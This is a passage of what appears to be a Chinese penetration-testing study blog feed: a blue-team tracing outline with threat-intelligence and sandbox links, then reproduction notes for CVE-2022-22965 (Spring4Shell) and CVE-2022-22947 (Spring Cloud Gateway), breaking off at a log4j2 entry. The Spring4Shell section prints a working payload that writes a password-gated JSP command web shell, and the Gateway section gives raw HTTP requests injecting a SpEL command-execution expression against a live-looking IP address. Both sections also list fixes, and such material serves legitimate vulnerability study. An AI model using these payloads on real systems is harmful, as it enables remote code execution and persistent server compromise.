title="EDR"></a>EDR</h5><p>终端安全防护</p><p>主动发现来自外部或内部的各类安全威胁。同时，基于端点的背景数据、恶意软件行为以及整体的高级威胁的生命周期的角度进行全面的检测和响应</p><h4 id="钓鱼邮件"><a href="#钓鱼邮件" class="headerlink" title="钓鱼邮件"></a>钓鱼邮件</h4><h5 id="1、通过钓鱼邮箱获取到哪些信息"><a href="#1、通过钓鱼邮箱获取到哪些信息" class="headerlink" title="1、通过钓鱼邮箱获取到哪些信息?"></a>1、通过钓鱼邮箱获取到哪些信息?</h5><ul><li>发件人id</li><li>IP地址</li><li>钓鱼服务器</li><li>恶意样本</li></ul><h5 id="2、溯源可以从哪些地方入手"><a href="#2、溯源可以从哪些地方入手" class="headerlink" title="2、溯源可以从哪些地方入手?"></a>2、溯源可以从哪些地方入手?</h5><ul><li>渗透拿下钓鱼服务器权限–收集信息</li><li>注册信息</li><li>邮箱域名注册商</li><li>C2</li><li>排查内部反连</li></ul><h2 id="溯源反制手段"><a href="#溯源反制手段" class="headerlink" title="溯源反制手段"></a>溯源反制手段</h2><ul><li>IP定位技术</li><li>恶意样本</li><li>社交账号</li><li>ID追踪术</li></ul><h3 id="溯源的方法"><a href="#溯源的方法" class="headerlink" title="溯源的方法"></a>溯源的方法</h3><p><img src="assets/image-20230508122140322.png" alt="image-20230508122140322"></p><h4 id="威胁情报平台"><a href="#威胁情报平台" class="headerlink" title="威胁情报平台"></a>威胁情报平台</h4><ul><li><a href="https://www.secpulse.com/archives/173479.html">https://www.secpulse.com/archives/173479.html</a></li><li><a href="https://www.virustotal.com/">https://www.virustotal.com/</a>    VirusTotal</li><li><a href="https://x.threatbook.cn/%E5%BE%AE%E6%AD%A5%E5%9C%A8%E7%BA%BF">https://x.threatbook.cn/微步在线</a> 微步情报社区</li><li><a href="https://ti.qianxin.com/%E5%A5%87%E5%AE%89%E4%BF%A1%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5">https://ti.qianxin.com/奇安信威胁情报</a></li><li><a href="https://ti.360.net/">https://ti.360.net/</a> 360威胁情报中心</li><li><a href="https://www.venuseye.com.cn/%E5%90%AF%E6%98%8E%E6%98%9F%E8%BE%B0%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5">https://www.venuseye.com.cn/启明星辰威胁情报</a></li><li><a href="https://redqueen.tj-un.com天际友盟redquee安全智能服务平台/">https://redqueen.tj-un.com天际友盟REDQUEE安全智能服务平台</a></li><li><a href="https://poma.nsfocus.com/">https://poma.nsfocus.com/</a> 绿盟的威胁分析中心</li></ul><h4 id="ip反查"><a href="#ip反查" class="headerlink" title="ip反查"></a>ip反查</h4><ul><li><a href="https://www.chaipip.com/">https://www.chaipip.com/</a> 高精度IP地址查询-查IP</li><li><a href="https://www.opengps.cn/Data/IP/ipplus.aspx%E9%AB%98%E7%B2%BE%E5%BA%A6IP%E5%AE%9A%E4%BD%8D">https://www.opengps.cn/Data/IP/ipplus.aspx高精度IP定位</a></li><li><a href="https://www.ipip.net/ip.html">https://www.ipip.net/ip.html</a>  ip反查</li><li><a href="http://ip.yqie.com/">http://ip.yqie.com/</a> ip地址反向查询</li><li><a href="http://qd.yyimg.com/act/index/id/">http://qd.yyimg.com/act/index/id/</a> 百度ID反查</li><li><a href="https://www.reg007.com/">https://www.reg007.com/</a> 注册网站反查</li><li><a href="https://ip.rtbasia.com/">https://ip.rtbasia.com/</a> tbasia (IP查询)</li><li><a href="https://www.ipplus360.com/">https://www.ipplus360.com/</a> ipplus360 (IP查询)</li><li><a href="https://tool.lu/ip/">https://tool.lu/ip/</a> IP地址查询在线工具</li></ul><h4 id="在线云沙箱"><a href="#在线云沙箱" class="headerlink" title="在线云沙箱"></a>在线云沙箱</h4><ul><li><a href="https://ata.360.cn/detection">https://ata.360.cn/detection</a> 360沙箱云</li><li><a href="https://s.threatbook.cn微步云沙箱/">https://s.threatbook.cn微步云沙箱</a></li><li><a href="https://www.virustotal.com/gui/home/upload">https://www.virustotal.com/gui/home/upload</a> VirusTotal平台</li><li><a href="https://www.maldun.com/submit/submit_file/">https://www.maldun.com/submit/submit_file/</a> 魔盾安全分析平台</li><li><a href="https://app.any.run/">https://app.any.run/</a>  Any.Run交互式恶意软件分析平台</li><li><a href="https://habo.qq.com/">https://habo.qq.com/</a> 腾讯哈勃系统</li><li><a href="https://mac-cloud.riskivy.com/">https://mac-cloud.riskivy.com</a>  FreeBuf x 漏洞盒子「大圣云沙箱</li></ul><h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><p>2022实战|记一次Everything服务引发的蓝队溯源</p><p>HW防守|溯源案例之百度ID层层拨茧</p><p>记一次反制追踪溯本求源</p><p><a href="https://www.sohu.com/a/468288041_120747399">https://www.sohu.com/a/468288041_120747399</a> 境外黑客钓鱼邮件</p><p><a href="https://zhuanlan.zhihu.com/p/349611368%E7%9C%9F%E5%AE%9E%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6%E6%BA%AF%E6%BA%90">https://zhuanlan.zhihu.com/p/349611368真实钓鱼邮件溯源</a></p><p><a href="https://www.freebuf.com/articles/web/254538.html%E5%82%80%E5%84%A1%E6%9C%BA">https://www.freebuf.com/articles/web/254538.html傀儡机</a></p><p><a href="https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/BlueTeam/%E5%BA%94%E6%80%A5.md%E5%B7%A5%E5%85%B7">https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/BlueTeam/%E5%BA%94%E6%80%A5.md工具</a></p><h2 id="攻击者画像"><a href="#攻击者画像" class="headerlink" title="攻击者画像"></a>攻击者画像</h2><ul><li>攻击路径</li><li>身份画像</li></ul><h2 id="攻击工具反制"><a href="#攻击工具反制" class="headerlink" title="攻击工具反制"></a>攻击工具反制</h2><ul><li>蚊剑</li><li>sqlmap</li><li>cobalt strike</li></ul><h1 id="后溯源"><a href="#后溯源" class="headerlink" title="后溯源"></a>后溯源</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/32cve-lou-dong-fu-xian/3-cve-2022-22965-springrce/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/32cve-lou-dong-fu-xian/3-cve-2022-22965-springrce/</url>
      
        <content type="html"><![CDATA[<h1 id="1、漏洞概况与影响"><a href="#1、漏洞概况与影响" class="headerlink" title="1、漏洞概况与影响"></a>1、漏洞概况与影响</h1><h2 id="Spring生态体系"><a href="#Spring生态体系" class="headerlink" title="Spring生态体系"></a>Spring生态体系</h2><p><img src="assets/image-20230423120755325.png" alt="image-20230423120755325"></p><p><img src="assets/image-20230423120806287.png" alt="image-20230423120806287"></p><h2 id="漏洞情况"><a href="#漏洞情况" class="headerlink" title="漏洞情况"></a>漏洞情况</h2><p>2022年3月31日 </p><p>CVE-2022-22965 </p><p><a href="https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement">https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement</a> </p><h3 id="受影响范围："><a href="#受影响范围：" class="headerlink" title="受影响范围："></a>受影响范围：</h3><p>Spring Framework &lt; 5.3.18 </p><p>Spring Framework &lt; 5.2.20 </p><p>JDK ≥ 9 </p><h3 id="不受影响版本："><a href="#不受影响版本：" class="headerlink" title="不受影响版本："></a>不受影响版本：</h3><p> Spring Framework = 5.3.18 </p><p>Spring Framework = 5.2.20 </p><p>JDK &lt; 9 </p><p><strong>与Tomcat版本有关</strong></p><h2 id="tomcat部分测试结果"><a href="#tomcat部分测试结果" class="headerlink" title="tomcat部分测试结果"></a>tomcat部分测试结果</h2><p><img src="assets/image-20230423120947607.png" alt="image-20230423120947607"></p><h1 id="2、基础知识"><a href="#2、基础知识" class="headerlink" title="2、基础知识"></a>2、基础知识</h1><h2 id="Spring参数自动绑定"><a href="#Spring参数自动绑定" class="headerlink" title="Spring参数自动绑定"></a>Spring参数自动绑定</h2><pre class="line-numbers language-none"><code class="language-none">http://localhost:8083/addUser?name=wuya&amp;department.name=sec<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/image-20230423121216512.png" alt="image-20230423121216512"></p><pre class="line-numbers language-none"><code class="language-none">User.getDepartment()Department.setName()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="多级参数绑定"><a href="#多级参数绑定" class="headerlink" title="多级参数绑定"></a>多级参数绑定</h2><pre class="line-numbers language-none"><code class="language-none">参数名赋值：contry.province.city.district=yuelu调用链路：Contry.getProvince()Province.getCity()City.getDistrict( )District.setDistrictName()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="PropertyDescriptor"><a href="#PropertyDescriptor" class="headerlink" title="PropertyDescriptor"></a>PropertyDescriptor</h2><p>JDK自带： </p><p><code>Java Bean PropertyDescriptor</code> </p><p>自动调用类对象的get/set方法</p><h2 id="BeanWrapperImpl"><a href="#BeanWrapperImpl" class="headerlink" title="BeanWrapperImpl"></a>BeanWrapperImpl</h2><p>Spring自带： </p><p><code>BeanWrapperImpl</code> </p><p>对Spring容器中管理的对象，自动调用get/set方法</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>通过<code>Controller</code>的参数赋值（自动绑定）， </li><li>可以修改任意对象的属性值 </li><li>改什么？ </li><li>……</li></ul><h2 id="Tomcat日志"><a href="#Tomcat日志" class="headerlink" title="Tomcat日志"></a>Tomcat日志</h2><p><img src="assets/image-20230423121451623.png" alt="image-20230423121451623"></p><h2 id="access-log属性"><a href="#access-log属性" class="headerlink" title="access_log属性"></a>access_log属性</h2><ul><li>directory： access_log文件输出目录 </li><li>prefix： access_log文件名前缀 </li><li>suffix： access_log文件名后缀 </li><li>pattern： access_log文件内容格式 </li><li>fileDateFormat：access_log文件名日期后缀，默认 为.yyyy-MM-dd</li></ul><p><code>org.apache.catalina.valves.AccessLogValve</code> 对象</p><h1 id="3、漏洞本地源码复现"><a href="#3、漏洞本地源码复现" class="headerlink" title="3、漏洞本地源码复现"></a>3、漏洞本地源码复现</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><ul><li>操作系统：Windows </li><li>JDK：11.0.11 </li><li>Tomcat：9.0.60 </li><li>SpringBoot：2.6.3（注意不使用内置Tomcat） </li><li>把ROOT.war包放在tomcat/webapps目录下</li></ul><h2 id="准备内容"><a href="#准备内容" class="headerlink" title="准备内容"></a>准备内容</h2><ul><li>ApplicationMain </li><li>UserController</li><li>User </li><li>Department</li></ul><h2 id="部署到tomcat-x2F-webapps-x2F-ROOT"><a href="#部署到tomcat-x2F-webapps-x2F-ROOT" class="headerlink" title="部署到tomcat/webapps/ROOT"></a>部署到tomcat/webapps/ROOT</h2><p><img src="assets/image-20230423121748353.png" alt="image-20230423121748353"></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><pre class="line-numbers language-none"><code class="language-none">exploit.py --url http://localhost:8080/addUserhttp://192.168.70.13:8080/wuya.jsp?cmd=whoami<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="4、原理分析"><a href="#4、原理分析" class="headerlink" title="4、原理分析"></a>4、原理分析</h1><h2 id="HTTP-payload"><a href="#HTTP-payload" class="headerlink" title="HTTP payload"></a>HTTP payload</h2><pre class="line-numbers language-none"><code class="language-none">class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=wuya&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %&gt;//<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="参数描述"><a href="#参数描述" class="headerlink" title="参数描述"></a>参数描述</h2><table><thead><tr><th>参数名</th><th>参数值</th></tr></thead><tbody><tr><td><code>class.module.classLoader.resources.context.parent.pipeline.first.pattern</code></td><td><code>% { c 2 } i i f ( " j " . e q u a l s ( r e q u e s t . g e t P a r a m e t e r ( " p w d " ) ) ) { j a v a . i o . I n p u t S t r e a m i n = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getIn putStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } }</code></td></tr><tr><td><code>class.module.classLoader.resources.context.parent.pipeline.first.suffix</code></td><td><code>.jsp</code></td></tr><tr><td><code>class.module.classLoader.resources.context.parent.pipeline.first.directory</code></td><td><code>webapps/ROOT</code></td></tr><tr><td><code>class.module.classLoader.resources.conte xt.parent.pipeline.first.prefix</code></td><td><code>wuya</code></td></tr><tr><td><code>class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat</code></td><td></td></tr></tbody></table><p><code>org.apache.catalina.valves.AccessLogValve</code> 对象</p><h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><pre class="line-numbers language-none"><code class="language-none">class.module.classLoader.resources.context.parent.pipeline.first.patternUser.getClass()java.lang.Class.getModule()java.lang.Module.getClassLoader()org.apache.catalina.loader.ParallelWebappClassLoader.getResources()org.apache.catalina.webresources.StandardRoot.getContext()org.apache.catalina.core.StandardContext.getParent()org.apache.catalina.core.StandardHost.getPipeline()org.apache.catalina.core.StandardPipeline.getFirst()org.apache.catalina.valves.AccessLogValve.setPattern()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="User对象有什么属性？"><a href="#User对象有什么属性？" class="headerlink" title="User对象有什么属性？"></a>User对象有什么属性？</h2><p><strong>缓存了一个 Class属性</strong></p><p><img src="assets/image-20230423122411971.png" alt="image-20230423122411971"></p><h2 id="JSP木马"><a href="#JSP木马" class="headerlink" title="JSP木马"></a>JSP木马</h2><pre class="line-numbers language-none"><code class="language-none">&lt;%if("j".equals(request.getParameter("pwd"))){java.io.InputStream in =Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}}%&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="5、漏洞排查"><a href="#5、漏洞排查" class="headerlink" title="5、漏洞排查"></a>5、漏洞排查</h1><h2 id="排查思路"><a href="#排查思路" class="headerlink" title="排查思路"></a>排查思路</h2><ol><li>Spring 参数绑定功能 </li><li>JDK版本 9+ </li><li>Tomcat部署方式及版本 </li><li>Tomcat Access功能 </li><li>流量分析 </li><li>日志分析</li></ol><h1 id="5、漏洞修复"><a href="#5、漏洞修复" class="headerlink" title="5、漏洞修复"></a>5、漏洞修复</h1><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ol><li>升级Spring </li><li>升级Tomcat </li><li>安装安全产品，比如WAF</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/32cve-lou-dong-fu-xian/2-cve-2022-22947-spring-cloud-gateway-rce/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/32cve-lou-dong-fu-xian/2-cve-2022-22947-spring-cloud-gateway-rce/</url>
      
        <content type="html"><![CDATA[<h1 id="1、基本介绍"><a href="#1、基本介绍" class="headerlink" title="1、基本介绍"></a>1、基本介绍</h1><h2 id="介绍内容"><a href="#介绍内容" class="headerlink" title="介绍内容"></a>介绍内容</h2><h3 id="1）微服务架构与Spring-Cloud"><a href="#1）微服务架构与Spring-Cloud" class="headerlink" title="1）微服务架构与Spring Cloud"></a>1）微服务架构与Spring Cloud</h3><p><img src="assets/image-20230420200051077.png" alt="image-20230420200051077"></p><h3 id="2）Spring-Cloud生态"><a href="#2）Spring-Cloud生态" class="headerlink" title="2）Spring Cloud生态"></a>2）Spring Cloud生态</h3><p><a href="https://spring.io/projects/spring-cloud">https://spring.io/projects/spring-cloud</a> </p><ul><li><p>Eureka、Ribbon、OpenFeign、Hystrix、 Config、Zuul </p></li><li><p>Consul、Gateway、Bus、Stream、Sleuth、 zipkin </p></li><li><p>Nacos、Sentinel、Seata </p></li><li><p>……</p></li></ul><h3 id="3）网关作用与解决方案"><a href="#3）网关作用与解决方案" class="headerlink" title="3）网关作用与解决方案"></a>3）网关作用与解决方案</h3><h4 id="网关作用"><a href="#网关作用" class="headerlink" title="网关作用"></a>网关作用</h4><ul><li>智能路由 </li><li>负载均衡 </li><li>协议转换 </li><li>权限校验 </li><li>限流熔断 </li><li>黑白名单 </li><li>API监控 </li><li>日志审计</li></ul><h4 id="网关解决方案"><a href="#网关解决方案" class="headerlink" title="网关解决方案"></a>网关解决方案</h4><ul><li>Netflix Zuul </li><li>Spring Cloud Gateway </li><li>Kong </li><li>Nginx+Lua</li><li>…..</li></ul><h3 id="4）Spring-Cloud-Gateway"><a href="#4）Spring-Cloud-Gateway" class="headerlink" title="4）Spring Cloud Gateway"></a>4）Spring Cloud Gateway</h3><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;&lt;artifactId&gt;spring-cloud-gateway-server&lt;/artifactId&gt;&lt;version&gt;3.1.0&lt;/version&gt;&lt;/dependency&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><ul><li>路由（Route） </li><li>断言（Predicate） </li><li>过滤器（Filter)</li></ul><h3 id="5）Spring-Boot-Actuator"><a href="#5）Spring-Boot-Actuator" class="headerlink" title="5）Spring Boot Actuator"></a>5）Spring Boot Actuator</h3><ul><li>健康检查 </li><li>审计 </li><li>统计 </li><li>HTTP追踪 </li><li>……</li></ul><p>Prometheus</p><h4 id="Actuator使用"><a href="#Actuator使用" class="headerlink" title="Actuator使用"></a>Actuator使用</h4><pre class="line-numbers language-none"><code class="language-none">&lt;dependencies&gt;&lt;dependency&gt;&lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;&lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt;&lt;/dependencies&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6）Gateway和Actuator集成"><a href="#6）Gateway和Actuator集成" class="headerlink" title="6）Gateway和Actuator集成"></a>6）Gateway和Actuator集成</h3><h4 id="Gateway和Actuator"><a href="#Gateway和Actuator" class="headerlink" title="Gateway和Actuator"></a>Gateway和Actuator</h4><pre class="line-numbers language-none"><code class="language-none">management.endpoint.gateway.enabled=truemanagement.endpoints.web.exposure.include=gateway<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="Actuator操作Gateway接口列表"><a href="#Actuator操作Gateway接口列表" class="headerlink" title="Actuator操作Gateway接口列表"></a>Actuator操作Gateway接口列表</h4><pre class="line-numbers language-none"><code class="language-none">http://host:port/actuator/gateway/id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th>id</th><th>HTTP Method</th><th>描述</th></tr></thead><tbody><tr><td>globalfilters</td><td>GET</td><td>返回全局Filter列表</td></tr><tr><td>routefilters</td><td>GET</td><td>每个路由的filter</td></tr><tr><td>routes</td><td>GET</td><td>路由列表</td></tr><tr><td>routes/{id}</td><td>GET</td><td>指定路由的信息</td></tr><tr><td>routes/{id}</td><td>POST</td><td>创建路由</td></tr><tr><td>refresh</td><td>POST</td><td>刷新路由缓存</td></tr><tr><td>routes/{id}</td><td>DELETE</td><td>删除路由</td></tr></tbody></table><pre class="line-numbers language-none"><code class="language-none">http://192.168.70.13:9000/actuator/gateway/globalfiltershttp://192.168.70.13:9000/actuator/gateway/routefiltershttp://192.168.70.13:9000/actuator/gateway/routeshttp://192.168.70.13:9000/actuator/gateway/routes/test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="添加路由-POST-Body"><a href="#添加路由-POST-Body" class="headerlink" title="添加路由 POST Body"></a>添加路由 POST Body</h4><pre class="line-numbers language-none"><code class="language-none">{  "id": "wuyaaq",  "filters": [    {      "name": "AddResponseHeader",      "args": {        "name": "Result",        "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[{\"whoami\"}).getInputStream()))}"      }    }  ],  "uri": "http://example.com"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="2、漏洞复现"><a href="#2、漏洞复现" class="headerlink" title="2、漏洞复现"></a>2、漏洞复现</h1><h2 id="1、启动Spring-Cloud-Gateway服务"><a href="#1、启动Spring-Cloud-Gateway服务" class="headerlink" title="1、启动Spring Cloud Gateway服务*"></a>1、启动Spring Cloud Gateway服务*</h2><ol><li>1、本地工程 </li><li>2、vulhub - docker compose启动 </li><li>3、vulfocus.io注册账号 </li><li>4、马士兵教育（八方网域）自研靶场</li></ol><h2 id="2、添加过滤器（POST）"><a href="#2、添加过滤器（POST）" class="headerlink" title="2、添加过滤器（POST）"></a>2、添加过滤器（POST）</h2><pre class="line-numbers language-none"><code class="language-none">POST /actuator/gateway/routes/hacktest HTTP/1.1Host: 47.120.13.249:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/jsonContent-Length: 329{  "id": "wuyaaq",  "filters": [{    "name": "AddResponseHeader",    "args": {      "name": "Result",      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"    }  }],  "uri": "http://example.com"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、刷新过滤器（POST）"><a href="#3、刷新过滤器（POST）" class="headerlink" title="3、刷新过滤器（POST）"></a>3、刷新过滤器（POST）</h2><pre class="line-numbers language-none"><code class="language-none">POST /actuator/gateway/refresh HTTP/1.1Host: 47.120.13.249:8080Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Connection: keep-aliveContent-Length: 3Content-Type: application/x-www-form-urlencodedOrigin: nullSec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: cross-siteUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0a=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4、访问过滤器ID（GET）"><a href="#4、访问过滤器ID（GET）" class="headerlink" title="4、访问过滤器ID（GET）"></a>4、访问过滤器ID（GET）</h2><pre class="line-numbers language-none"><code class="language-none">GET /actuator/gateway/routes/hack HTTP/1.1Host: 47.120.13.249:8080Proxy-Connection: keep-aliveCache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3、原理分析"><a href="#3、原理分析" class="headerlink" title="3、原理分析"></a>3、原理分析</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>为什么添加过滤器（路由）会导致代码执行？</p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><ol><li>1、开启Acutator，可以通过接口列出路由（包括过 滤器），如：<code>/actuator/gateway/routes</code> </li><li>2、可以通过<code>/gateway/routes/{id_route_to_create}</code> 创建路由 </li><li>3、通过<code>/actuator/gateway/refresh</code>刷新路由 </li><li>4、当路由带有恶意的Filter，里面的spEL表达式会被执行</li></ol><h2 id="payload分析"><a href="#payload分析" class="headerlink" title="payload分析"></a>payload分析</h2><pre class="line-numbers language-none"><code class="language-none">#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p><code>ConfigurationService</code>类</p><p><img src="assets/image-20230420202539716.png" alt="image-20230420202539716"></p><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><p><code>ShortcutConfigurable</code>类</p><p><img src="assets/image-20230420202609612.png" alt="image-20230420202609612"></p><h1 id="4、扫描与修复"><a href="#4、扫描与修复" class="headerlink" title="4、扫描与修复"></a>4、扫描与修复</h1><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul><li>Spring Cloud Gateway &lt; 3.1.1 </li><li>Spring Cloud Gateway &lt; 3.0.7</li></ul><p><a href="https://tanzu.vmware.com/security/cve-2022-22947">https://tanzu.vmware.com/security/cve-2022-22947</a></p><p>Pivotal</p><h2 id="zoomeye"><a href="#zoomeye" class="headerlink" title="zoomeye"></a>zoomeye</h2><pre class="line-numbers language-none"><code class="language-none">app="vmware-SpringBoot-framework"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="批量检测"><a href="#批量检测" class="headerlink" title="批量检测"></a>批量检测</h2><p><code>scan.py</code></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><h3 id="1-更新升级-Spring-Cloud-Gateway-到以下安全版本："><a href="#1-更新升级-Spring-Cloud-Gateway-到以下安全版本：" class="headerlink" title="1.更新升级 Spring Cloud Gateway 到以下安全版本："></a>1.更新升级 Spring Cloud Gateway 到以下安全版本：</h3><ul><li>Spring Cloud Gateway &gt;=3.1.1 </li><li>Spring Cloud Gateway &gt;=3.0.7</li></ul><h3 id="2-或在不考虑影响业务的情况下禁用-Actuator-接口"><a href="#2-或在不考虑影响业务的情况下禁用-Actuator-接口" class="headerlink" title="2.或在不考虑影响业务的情况下禁用 Actuator 接口"></a>2.或在不考虑影响业务的情况下禁用 Actuator 接口</h3><pre class="line-numbers language-none"><code class="language-none">management.endpoint.gateway.enable:false<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/32cve-lou-dong-fu-xian/1-cve-2021-44228-log4j2/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/32cve-lou-dong-fu-xian/1-cve-2021-44228-log4j2/</url>
      
